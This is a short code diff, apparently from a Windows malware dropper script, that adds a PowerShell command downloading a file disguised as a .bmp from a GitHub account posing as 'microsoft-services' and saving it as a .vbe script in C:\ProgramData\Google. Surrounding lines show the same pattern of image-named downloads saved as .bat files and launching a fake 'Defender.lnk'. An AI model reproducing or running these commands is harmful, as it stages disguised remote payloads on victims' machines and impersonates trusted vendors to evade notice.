@@ -27,8 +27,14 @@ powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://raw.gi
 
 start-sleep -s 6
   Start "C:\ProgramData\Google\Maps\Defender.lnk"
+
+
  start-sleep -s 6
 
+
+ powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://raw.githubusercontent.com/microsoft-services/staff/abouts/view.bmp', 'C:\ProgramData\Google\Maps.vbe') }"
+
+ start-sleep -s 6
 
  powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://raw.githubusercontent.com/microsoft-services/staff/abouts/jod.img', 'C:\ProgramData\Google\Jod.bat') }"
 
